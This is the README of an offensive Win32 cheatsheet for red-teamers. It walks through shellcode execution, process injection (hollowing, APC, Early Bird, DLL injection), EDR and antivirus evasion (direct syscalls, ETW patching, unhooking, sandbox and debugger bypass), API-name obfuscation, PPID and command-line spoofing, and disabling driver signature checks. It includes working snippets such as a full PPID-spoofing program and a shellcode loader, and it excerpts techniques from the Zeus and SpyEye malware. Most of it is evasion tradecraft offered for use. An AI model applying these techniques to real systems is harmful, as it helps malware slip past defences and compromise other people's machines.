# original repo
https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet
# Win32 Offensive Cheatsheet

Win32 and Kernel abusing techniques for pentesters & red-teamers made by [@UVision](https://github.com/matthieu-hackwitharts) and [@RistBS](https://twitter.com/RistBs)

**Dev mode enabled, open to any help :)**

**Windows Binary Documentation**

- [PE structure](#pe-headers)
 - [PE Headers ](#pe-headers)
 - [Parsing PE ](#parsing-pe)
 - [Export Address Table (EAT) ](#export-address-table)
  - [Resolve function address ](#export-address-table)
    - [Using address (Obvious :D)](#export-address-table)
    - [Using ordinal number](#export-address-table)
    - [Using function name](#export-address-table)
 - [Import Address Table (IAT) ](#import-address-table)
   - [Parsing IAT ](#parsing-iat)
 - [Import Lookup Table (ILT) ](#import-lookup-table)


**Execute some binary**

- [Classic shellcode execution](https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet/blob/main/shellcode_samples/classic.cpp)
- [DLL execute ](#dll-execute)
- [Reflective DLL execution ⏳]()
- [RAW file to PE](#raw-file-to-pe)


**Code injection techniques**

- [CreateRemoteThread injection](#createremotethread-injection)
- [Process Hollowing](#process-hollowing)
- [APC Queue technique](#apc-queue-technique)
 - [Early Bird](#early-bird)
- [Reflective DLL Injection ⏳]()
- [Dll injection](#dll-injection)
- [Process Doppelganging](#process-doppelganging)
- [Fibers](#fibers)
- [CreateThreadPoolWait ⏳]()
- [Thread Hijacking ⏳]()
- [MapView code injection ⏳]()
- [Module Stomping ⏳]()
- [Function Stomping](#function-stomping)
- [Complete PE injection in remote process ⏳]()

**Hooking techniques**
- [Inline hooking](#inline-hooking)
- [IAT hooking](#iat-hooking)


**RE Bypass techniques**

- [Call and Strings obfuscation](#call-and-strings-obfuscation)
- [Manual function resolve](#manual-function-resolve) 
- [Win32 API Hashing](#win32-api-hashing)


**EDR/Endpoint bypass**

- [Direct syscall ](#direct-syscall)
- [High level languages ](#high-level-languages)
- [Patch inline hooking](#patch-inline-hooking)
- [Detect hooks ⏳]()
- [Patch ETW](#patch-etw)
- [Sandbox bypass](#sandbox-bypass)
- [Debugging Bypass](#debugging-bypass)
- [Patch Kernel callbacks ⏳]()
- [VirtualProtect technique](#virtualprotect-technique)
- [Fresh copy unhook](#fresh-copy-unhook)
- [Hell's Gate](#hells-gate)
- [Heaven's Gate](#heavens-gate)
- [PPID spoofing](#ppid-spoofing)


**Driver Programming basics**

- [General concepts](#general-concepts)
- [Driver entry](#driver-entry)
- [Input Output)](#input-output)
- [Communicate with driver](#communicate-with-the-driver)
- [Driver signing (Microsoft)](#driver-signing)

**Offensive Driver Programming**

- [Process protection removing](#process-protection-removing)
- [Patch kernel callback (dev way) ⏳]()
- [Integrity and privileges levels ⏳]()
- [Enable SeDebug privilege ⏳]()

**Using Win32 API to increase OPSEC**

- [Persistence ⏳]()
 - [Scheduled Tasks ⏳]()
- [Command line spoofing](#command-line-spoofing)

<br>


# Malware/Sophisticated techniques

- [Case of Emotet : PPID Spoofing using WMI](#emotet-ppid-spoofing)
- [Zeus malware hidden files technique](#zeus-malware-hidden-files)
- [SpyEye keyloger hooking technique](#spyeye-keyloger-hooking-technique)
- [Most ridiculous malware stop (WannaCry)](#wannacry-killswitch)


<br>


# Windows Binary Documentation

## Useful tools and Websites/Books/Cheatsheet

- 🔹 https://github.com/RistBS/Awesome-RedTeam-Cheatsheet/ (Very Good Cheatsheet)
- 🔹 https://www.ired.team/ (Awesome red team cheatsheet with great code injection notes)
- 🔹 https://undocumented.ntinternals.net/ (Undocumented NT functions)
- 🔹 https://docs.microsoft.com/en-us/windows/win32/api/ (Microsoft Official Doc)
- 🔹 [Windows Kernel Programming - Pavel Yosifovich](https://www.amazon.fr/Windows-Kernel-Programming-Pavel-Yosifovich/dp/1977593372)
- 🔹 https://research.checkpoint.com/ (Very interesting docs about evasion, anti-debug and so more)
- 🔹 https://www.vx-underground.org/ (Awesome content about malware dev and reverse)

## PE Structure

### PE Headers

- `DOS_HEADER` : First Header of PE, contains MS DOS message ("This programm cannot be run in DOS mode...."), MZ Header (Magic bytes to identify PE) and some stub content.
- `IMAGE_NT_HEADER` : Contains PE file signature, File Header and Optionnal Header
- `SECTION_TABLE` : Contains sections headers
- `SECTIONS` : Not a header but useful to know : these are sections of the PE


Details : https://www.researchgate.net/figure/PE-structure-of-normal-executable_fig1_259647266


### Parsing PE

**Simple PE parsing to retrieve IAT and ILT absolute address:**

- **Obtain base address** : `GetModuleHandleA(NULL);`
- **PIMAGE_DOS_HEADER** = base address, dos header
- **PIMAGE_NT_HEADER** = `BaseAddress+PIMAGE_DOS_HEADER.e_lfnanew` (RVA NT_HEADER)
- **IMAGE_DATA_DIRECTORY** = `OptionnalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]` of PIMAGE_NT_HEADER
- **IMAGE_IMPORT_DIRECTORY** = `IMAGE_DATA_DIRECTORY.VirtualAddress` (RVA of IMAGE_IMPORT_DIRECTORY)
- **IMAGE_IMPORT_DESCRIPTOR** = `BaseAddress + IMAGE_IMPORT_DIRECTORY.VirtualAddress` (RVA of IMAGE_IMPORT_DESCRIPTOR)
- **IAT absolute address** : IMAGE_IMPORT_DESCRIPTOR.FirstThunk (RVA IAT) + BaseAddress
- **ILT absolute address** : IMAGE_IMPORT_DESCRIPTOR.OriginalFirstThunk (RVA ILT) + BaseAddress


### Export Address Table

- Often called "EAT"
- Resolve all functions that are exported by the PE
- Resolve DLLs
- Defined in IMAGE_EXPORT_DIRECTORY structure:
```csharp
 public struct IMAGE_EXPORT_DIRECTORY
    {
        public UInt32 Characteristics;
        public UInt32 TimeDateStamp;
        public UInt16 MajorVersion;
        public UInt16 MinorVersion;
        public UInt32 Name;
        public UInt32 Base;
        public UInt32 NumberOfFunctions;
        public UInt32 NumberOfNames;
        public UInt32 AddressOfFunctions;     // RVA EAT and contains also RVA of exported functions
        public UInt32 AddressOfNames;     // Pointer array contains address of function names
        public UInt32 AddressOfNameOrdinals;  // Pointer array contains address of ordinal number of functions (index in AddressOfFunctions)
    }
```
 
### Resolve function address
 

**Using function address**
 
What do you wait ? Find this function !
 
**Using ordinal number**
 
An ordinal number is an **index position** to the corresponding function address in AddressOfFunctions array. It can be used to **retrieve the correct address of function**, like below : 
 
 Let's try to find the corresponding address (Addr4) with given ordinal number 3.
 
 - **AddressOfFunctions** : *Addr1 Addr2 Addr3 Addr4 .... AddrN*
 - **AdressOfNameOrdinals** : *2 5 7 3 ... N*
 
 The address we are looking for is on 3th position (from 0), and our ordinal number corresponds to the **index of this address**.
 
 **Using function name**
 
The Nth element in AddressOfNames array corresponding to the Nth element in AddressOfNameOrdinals array : using a given name, you can retrieve the corresponding ordinal number, and proceed to find the function address using this number.

## Import Address Table

- Often called "IAT"
- The PE loader doesn't know what address is corresponding to which function (again more with ASLR) : Let's call IAT to save us 
- Defined in IMAGE_IMPORT_DIRECTORY struct: 

```
typedef struct _IMAGE_IMPORT_DESCRIPTOR {
  
    DWORD	Characteristics; 
    DWORD	OriginalFirstThunk;	//RVA to ILT
    DWORD	TimeDateStamp;	
    DWORD	ForwarderChain;
    DWORD	Name; //RVA of imported DLL name
    DWORD	FirstThunk; //RVA to IAT
} IMAGE_IMPORT_DESCRIPTOR,*PIMAGE_IMPORT_DESCRIPTOR;
```
<br>
<br>

## Parsing IAT

1) Obtain RVA of IAT 
2) Parse trough IMPORT_DESCRIPTOR structure : Name member is the RVA of the name of current DLL
3) To get the real DLL name : find it in ILT (originalFirstThunk+BaseAddress)
4) To get exported functions of current DLL : PIMAGE_IMPORT_BY_NAME function_name->Name = ImageBase+AdressOfData

> Detailed code example here : https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet/blob/main/miscellaneous/iat_parser.cpp

## Import Lookup Table

Every DLLs imported by PE has its own ILT.
<br>
```
Absolute address of ILT = BaseAddress + OriginalFirstThunk (IAT)
```

Contains all functions name that are in imported DLL.
<br>
<br>

## DLL Execute

This technique had some good successful bypass rates few years ago; however, because of increasing number of EDR and other endpoint solutions, writing on disk should as possible be avoided.

> Sample : https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet/blob/main/shellcode_samples/dll_classic.cpp


## Direct Syscall

Most EDR products will hook win32 api calls in user mode (PatchGuard strongly decrease kernel hooks availability). To avoid these hooks, you can directly call Nt() equivalent to your api functions.

- 
```asm
.code
	SysNtCreateFile proc
			mov r10, rcx //syscall convention
			mov eax, 55h //syscall number : in this case it's NtCreateFile
			syscall //call nt function
			ret
	SysNtCreateFile endp
end
```
> Find the right syscall number at this table : https://j00ru.vexillium.org/syscalls/nt/64/


- Build the Function Prototype using `NTSTATUS`
```cpp
EXTERN_C NTSTATUS SysNtCreateFile(
	PHANDLE FileHandle, 
	ACCESS_MASK DesiredAccess, 
	POBJECT_ATTRIBUTES ObjectAttributes, 
	PIO_STATUS_BLOCK IoStatusBlock, 
	PLARGE_INTEGER AllocationSize, 
	ULONG FileAttributes, 
	ULONG ShareAccess, 
	ULONG CreateDisposition, 
	ULONG CreateOptions, 
	PVOID EaBuffer, 
	ULONG EaLength);
```
- Resolve the NT address
```cpp
FARPROC addr = GetProcAddress(LoadLibraryA("ntdll"), "NtCreateFile");
```

> Code sample : https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet/blob/main/evasion/direct_syscall.cpp

## High Level Languages

C++/C are often more flagged by AV/EDR products than high level equivalent languages : use Go, Rust or other language to craft your best templates !

## DLL Injection

You can inject some code stored in a dll in a remote process. Unfortunately, EDRs product will likely catch it easily, especially if malicious dll touch the disk.

> Code sample : https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet/blob/main/shellcode_samples/dll_injection.cpp

## Sandbox Bypass

Sandbox are quite used by AV/EDRs to test some API calls and other part of code before to really execute your programm. There are several techniques to avoid this tool, here are some of them below :

- Wait. Seriously. Such function as `Sleep()` or `time.sleep()` or equivalent will do the job, for some seconds before to execute the real shellcode.
- Try to allocate lot of memory (malloc), like 100000000 bytes.
- Try to detect if you are actually in a sandbox (VM) environnement : test for open process,files and others suspicious things.
- Try to resolve a fake (not working) URL : many AVs products will respond with fake page.
- Use strange and rarely used Api calls, like `VirtualAllocExNuma()` most sandbox cannot emulate this type of call.
```cpp
IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
```


## Debugging Bypass

Not a real AV evasion technique, but still useful to avoid being reversed too easily by RE engineers. There are so many ways to detect or make debuggers crazy, but here are some of them below : 

**Flags way**

You can use ```IsDebuggerPresent()``` (Win32) or direct call ```NtQueryInformationProcess()``` (not so very documented) to check for debug flags.


**Handles way**

Try to close invalid (missing) handles with CloseHandle() API. The debugger will try to catch the exception, which can be easily detected : 
```cpp
bool Check() //https://anti-debug.checkpoint.com/techniques/object-handles.html#closehandle
{
    __try
    {
        CloseHandle((HANDLE)0xDEADBEEF);
        return false;
    }
    __except (EXCEPTION_INVALID_HANDLE == GetExceptionCode()
                ? EXCEPTION_EXECUTE_HANDLER 
                : EXCEPTION_CONTINUE_SEARCH)
    {
        return true;
    }
}
```

**ASM way**

Try to make an INT 3 call (ASM) : it's an equivalent to a software breakpoint, which will trigger a debugger. There are so many other ways to detect any debugger, a lot of them are compiled at : https://anti-debug.checkpoint.com/


## CreateRemoteThread injection

Simply write your shellcode in previously allocated memory space inside the target process. (Not OPSEC)

> Code sample : https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet/blob/main/shellcode_samples/create_thread_injection.cpp


## Inline Hooking
 
 Inline hooking is the most basic way to hook a function : it simply consists to redirect the API call to your own function (jump)
 

> Code sample : https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet/blob/main/hooking/inline.cpp


## Patch Inline Hooking

Simply (re) hook your hooked functions by apply the right function call: https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet/blob/main/hooking/inline.cpp



# Driver Basics

## General Concepts

Driver are used to execute code in kernel mode rather than in user mode.
It is a powerful technique to bypass all usermode hooks and monitoring which were set by AV/EDRs.

It can be also used to bypass kernel callbacks and other kernel monitoring.

The code of any driver must be verified (any warning should be treated as an error) to ensure it will be crash-free (You don't want to cause BSOD during pentest, right ?).

Few years ago, Microsoft decided to ban unsigned drivers from his operating system : you must disable it before to load your own driver, or use any vulnerability (like https://github.com/hmnthabit/CVE-2018-19320-LPE) to disable driver signing.

In a real pentest, you must find any vulnerable driver and profit:)


## Driver Entry

- Driver entry proc is defined as below : 
```cpp
#include <ntddk.h>
NTSTATUS
DriverEntry(
	_In_ PDRIVER_OBJECT DriverObject,
	_In_ PUNICODE_STRING RegistryPath)
{
	return STATUS_SUCCESS;
}
```

It is very important to use `UNREFERENCED_PARAMETER()` macro on `DriverObject` and `RegistryPath` parameters, unless they are referenced by adding some code later.
```cpp
UNREFERENCED_PARAMETER(DriverObject);
UNREFERENCED_PARAMETER(RegistryPath);
```

## Win32 API Hashing

You can hide your API function calls by hash them with some hash algorithm (djb2 is the most used), be careful of hash collision that are possible with some special funcs.

Then combine this technique with a direct address resolving in EAT, and let reversers cry :)


## Call and strings obfuscation

There are several techniques you can use to hide your calls to win32 api, here are some of them: 

- Use `char[]` array to splice your function/dll names into multiple chars
```cpp
char sWrite[] = {'W','r','i','t','e','P','r','o','c','e','s','s','M','e','m','o','r','y',0x0}; //don't forget the null byte
```

You can even combine this trick with some ASCII char code convert.


## Manual Function resolve

You can manually resolve a pointer to any function of kernel32, ntdll and so more.

- First declare the template of your function, based on the real function header : 
```cpp
typedef HANDLE(WINAPI* myOpenProcess)(DWORD,BOOL,DWORD); //if you work directly with ntdll, use NTAPI*
```
- Then resolve a pointer to the function :
```cpp
myOpenProcess op_proc = (myOpenProcess*)GetProcAddress(LoadLibraryA("ndll.dll"),"OpenProcess"));
op_proc(PROCESS_ALL_ACCESS,NULL,12345);
```

> Don't hesitate to combine this technique with some strings obfuscation to avoid passing the real func name in plaintext.


## VirtualProtect technique

By using some tricks with `VirtualProtect()` you can easily avoid been flagged in-memory : change between `PAGE_EXECUTE_READWRITE` and `PAGE_READWRITE` (less suspicious) to avoid triggering your favorite AV.




## IAT Hooking

By modifying the corresponding function address to a pointer on your own function, you can make the programm executing your own code.

It can be done by following several steps : 

- Find the relative address of IAT
- Parse the IAT to find the function you want to hook
- Replace this function address ("patch") with the adress of your function
- Enjoy

<br>

Code sample : https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet/blob/main/hooking/iat.cpp


## Fresh Copy Unhook

Avoid hooks by replacing the "hooked" ntdll by a fresh one, directly mapped from the disk.

Code sample : //à ajouter

## Input Output

Use MajorFunction IRP_MJ_CREATE and IRP_MJ_CLOSE to act as "interrupt" to communicate with your driver from client-side.

```cpp
DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateClose;
```

Then define your CreateClose function : 

```cpp
NTSTATUS
CreateClose(
	_In_ PDEVICE_OBJECT DeviceObject,
	_In_ PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	DbgPrint("[+] Hello from FirstDriver CreateClose\n");

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;

	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return STATUS_SUCCESS;
}
```

Complete sample code here : //

## Raw File To PE

You can execute some raw binary file in memory by allocate its size space in a  memory region :

```cpp
HANDLE binfile = CreateFileA("myfile.bin",GENERIC_READ,NULL,NULL,OPEN_EXISTING,NULL,NULL);
SIZE_T size = GetFileSize(binfile,NULL);
LPVOID buffer=NULL;
ReadFile(binfile,buffer,size,NULL,NULL);
HANDLE hProc = GetCurrentProcess();

CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);
CloseHandle(hProc);
```

## Heavens Gate

Use Wow64 to inject 64 bits payload in 32 bits loader. Can be useful to bypass some AV/EDRs because Wow64 will avoid you to be catch in userland.

The most known version of this technique has been created by the MSF team, see their awesome work here : https://github.com/rapid7/metasploit-framework/blob/21fa8a89044220a3bf335ed77293300969b81e78/external/source/shellcode/windows/x86/src/migrate/executex64.asm


## Communicate with the driver

```
User-mode applications send IOCTLs to drivers by calling DeviceIoControl, which is described in Microsoft Windows SDK documentation. Calls to DeviceIoControl cause the I/O manager to create an IRP_MJ_DEVICE_CONTROL request and send it to the topmost driver (https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/introduction-to-i-o-control-codes)
```

The userland app must use DeviceIoControl (ioapiset.h) function to communicate with a driver.
It will be used to send various requests to its **Device** object.

Simple sample code here : //todo

## Driver signing

As described in [General concepts](#general-concepts) section, drivers must be signed before to install on a Windows system. Despite the fact you must use some driver or kernel exploit to bypass it (Gigabyte driver CVE for example), you can still disable it manually :

```
bcdedit.exe -set loadoptions DISABLE_INTEGRITY_CHECKS
```

```
bcdedit.exe -set TESTSIGNING ON
```

Then restart your computer;obviously you need local admin rights on the machine you want to execute these command. As a restart is needed, **this not opsec at all**.


## PPID Spoofing

When a suspicious/anormal process start below a "legit" or unattended process parent, it become very suspicious. Think about a malicious Word macro which deploy a powershell process : such strange, right ?

PPID Spoofing can avoid that by allowing you to modify the parent process id (PPID) of your spawned process.

```cpp
#include <windows.h>
#include <TlHelp32.h>
#include <iostream>

//code from : https://www.ired.team/offensive-security/defense-evasion/parent-process-id-ppid-spoofing
int main() 
{
	STARTUPINFOEXA si;
	PROCESS_INFORMATION pi;
	SIZE_T attributeSize;
	ZeroMemory(&si, sizeof(STARTUPINFOEXA));
	
	HANDLE parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, false, 6200);

	InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
	InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
	UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle, sizeof(HANDLE), NULL, NULL);
	si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	CreateProcessA(NULL, (LPSTR)"notepad", NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);

	return 0;
}
```


## Process Protection Removing

A **protected process** have the "protected" mode enable in the kernel : using the PPL (Protected Process Light) technology, it can be protected from various things like code injection, memory dump, etc. You can enable it for lsass to avoid password dumping by modifying some reg keys.

To remove this protection, you must load some malicious driver.

Code sample : //


## Hells Gate

To avoid using hardcoded syscalls, Hell's Gate (Hells Gates ?) retrieve them dynamically by parsing EAT (compare memory bytes to syscall opcodes). The original Poc has been made by the great VX-Underground team, and can be found here : https://papers.vx-underground.org/papers/Windows/Evasion%20-%20Systems%20Call%20and%20Memory%20Evasion/Dynamically%20Retrieving%20SYSCALLs%20-%20Hells%20Gate.7z


## Command Line Spoofing

Works perfectly even with sysmon/process hacker monitoring; it enables the ability to hide your command args, which can be useful in pentest/red team ops (```powershell -enc .....```)

To achieve that objective, you can spawn a new process with "legit" command args in supended mode, then edit these args directly in PEB.

Poc : https://github.com/NVISOsecurity/blogposts/blob/master/examples-commandlinespoof/Example%203%20-%20CMD%20spawn%20with%20fake%20procexp%20args/code.cpp

## Function Stomping

Simply replace the original function address (obtained with GetProcAddress) with the new one. This technique is well detailed by his author : https://idov31.github.io/2022-01-28-function-stomping/

## Process Hollowing

Process Hollowing is made in several steps : 

- Create the targeted process ("hollowed" one) in suspended mode : it is needed to modify it

- Unmap the targeted process from its PEB (You must declare this structure first)

- Write the content of the new exe in this process : headers + content

- Parse and apply relocation table 

- Let the process continue to run in its thread

- Enjoy

Complete POC can be found here : https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations


## APC Queue Technique

Inject your shellcode in all available threads in a process, then use ```QueueUserAPC()``` function to query an APC call. This technique can not be reliable when there are no many threads in the compromised process.

Sample code : https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet/blob/main/shellcode_samples/apc.cpp

## Fibers

Fibers can be defined as ```cooperatively scheduled threads (https://nullprogram.com/blog/2019/03/28/)```. It allows the main program to execute the shellcode trough this new thread type. 

Code sample : https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet/blob/main/shellcode_samples/fiber.cpp


## Early Bird

Similar to APC Queue injection, here the APC call must be set in a suspended process. The created process main thread is then resume; the main advantage of this technique is that avoiding writing the shellcode in a running process will be less detected by AV/EDRs.

Code sample : https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet/blob/main/shellcode_samples/earlybird.cpp

## Patch ETW

ETW (```Event Tracing for Windows```) is a logging low-level API which can be used for debugging/logging kernel and usermode process. It has been first implemented in Windows 2000, but realtime monitoring is really available since Windows XP.

ETW API is available from headers files provided by Microsoft : https://docs.microsoft.com/fr-fr/windows/win32/api/_etw/

In a pentest operation, you should care about this functionality by patching it : the most used way is to write arbitrary ```ret``` opcodes into the ETW event writing function (```EtwEventWrite```) to avoid logs be writing somewhere.

Code sample : 

## Process Doppelganging

Process Doppelganging was until a few years an untected method of launching your own payload into some tricky way. It has been demonstrated at BlackHat 2017 by Tal Liberman and Eugene Kogan, see their amazing work : https://www.youtube.com/watch?v=Cch8dvp836w

It is an "intermediate" step before the process hollowing technique : the PE image is indeed overwrited before to get executed, so the WindowsLoader make the Process Hollowing for us (so cool, right ?).

Hasherezade has maked some cool POC of this technique, availabe here : https://github.com/hasherezade/process_doppelganging

## Emotet PPID Spoofing 

This technique has been discovered in the well-known malware Emotet. To spawn a new powershell process (intented to execute some payload), it use the COM api with a WMI instance. With this trick, the powershell process is spawned as a child process of the WMIPrvSE process, which far less suspicious than be spawning by a suspicious exe or even a Word file.

## Zeus Malware Hidden Files

The well-know Zeus malware use some quite ingenious trick to hide its logs (keystrokes, password ,etc) in the compromised system. It hooks the ```NtQueryDirectoryFile()``` function to filter displayed results.

```cpp
typedef struct _FILE_NAMES_INFORMATION {
 ULONG NextEntryOffset;
 ULONG FileIndex;
 ULONG FileNameLength;
 WCHAR FileName[1];
} FILE_NAMES_INFORMATION, *PFILE_NAMES_INFORMATION;

 if (file_matches)
 {

 // Check for end of list
 if (pCurrentFileNames->NextEntryOffset == 0)
 {
 // Hide current file
 if (pPrev)
 pPrevFileNames->NextEntryOffset = 0;
 else
 return STATUS_NO_SUCH_FILE; 
 ```
 
 Source : https://ioactive.com/pdfs/ZeusSpyEyeBankingTrojanAnalysis.pdf
 
 
 ## SpyEye keyloger hooking technique
 
 SpyEye malware hooks ```TranslateMessage()``` function to save keystrokes : the hook procedure use ```GetKeyboardState``` function to add the typed char to a 20000 bytes buffer.
 
 Source : https://ioactive.com/pdfs/ZeusSpyEyeBankingTrojanAnalysis.pdf
 
 ## Wannacry KillSwitch
 
 Wannacry ransomware used a killswitch URL which was resolved before the execution of the main payload. After this domaine has been registred, all wannacry samples has been disabled. This technique was related here : https://www.malwaretech.com/2017/05/how-to-accidentally-stop-a-global-cyber-attacks.html
 Fun fact: this domain was in clear string, without any obfuscation. Quite funny:)
 
 
